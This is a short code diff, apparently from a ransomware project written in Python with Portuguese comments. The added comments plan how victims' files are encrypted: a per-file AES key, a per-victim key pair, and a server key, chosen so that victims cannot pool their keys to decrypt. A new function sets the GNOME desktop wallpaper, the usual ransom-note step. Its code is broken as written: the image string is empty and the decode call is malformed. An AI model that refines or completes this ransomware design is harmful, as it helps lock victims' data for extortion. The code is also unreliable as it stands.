@@ -190,7 +190,21 @@ def menu():
     # # change wallpaper
     # # create file with all encrypted files path's
 
+    # AES for each file and encrypt AES.keys with Spub.key
+    # é ruim porque infectados podem se juntar para decrypt todos os arquivos AES
+    # não tem algo que é unico para cada infecção que é o key pair 
+     
+    # AES for each file and encrypt AES.keys with Cpub.key and encrypt Cpriv.key with Spub.key 
+    # pode assinar o dado de cada vitma a ela mesma, 
+    # gera um nível a mais de dependencia 
 
+
+
+def change_wallpaper():
+    img = """"""
+    with open("img.png", 'wb') as f:
+        f.write(img.base64.b64decode(img))
+    os.system('gsettings set org.gnome.desktop.background picture-uri {}'.format("img.png"))
 
 
 if __name__ == "__main__":
